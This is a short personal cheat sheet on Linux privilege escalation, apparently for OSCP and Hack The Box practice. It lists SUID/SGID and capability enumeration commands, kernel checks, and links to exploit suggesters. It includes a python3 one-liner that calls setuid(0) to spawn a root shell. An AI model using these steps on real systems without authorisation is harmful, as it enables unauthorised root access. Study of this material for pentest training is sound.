# Linux Privesc

{% embed url="https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Linux%20-%20Privilege%20Escalation.md#systemd-timers" %}

incorrect path, scripts running as root, cronjobs, docker container, git server

there are some crazy techniques ippsec and tj the plugs, we gonna document those and any cool ones we do here

```
sudo -l
find / -perm -g=s -type f 2>/dev/null    # SGID
find / -perm -u=s -type f 2>/dev/null    # SUID

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID < full search  
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin < quicker   

find / perm /u=s -user "Username" 2>/dev/null  
```

#### Find SUID root files <a href="#find-suid-root-files" id="find-suid-root-files"></a>

```
find / -user root -perm -4000 -print  2>/dev/null
```

#### Find SGID root files: <a href="#find-sgid-root-files" id="find-sgid-root-files"></a>

```
find / -group root -perm -2000 -print 2>/dev/null
```

#### Find SUID and SGID files owned by anyone: <a href="#find-suid-and-sgid-files-owned-by-anyone" id="find-suid-and-sgid-files-owned-by-anyone"></a>

```
find / -perm -4000 -o -perm -2000 -print  2>/dev/null
```

### Capabilities

```
/usr/bin/getcap -r / 2>/dev/null        # list all 
/usr/bin/setcap -r /bin/ping            # remove
/usr/bin/setcap cap_net_raw+p /bin/ping # add
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Kernel <a href="#kernel" id="kernel"></a>

{% embed url="https://github.com/mzet-/linux-exploit-suggester" %}

{% embed url="https://github.com/jondonas/linux-exploit-suggester-2" %}

```
cat /proc/version
uname -a
uname -ar
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

{% embed url="https://guif.re/linuxeop" %}

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----16397895490f--------------------------------" %}
READDDD from HTB Usage
{% endembed %}

{% embed url="https://t0o0tz.com/posts/post0x0004/" %}
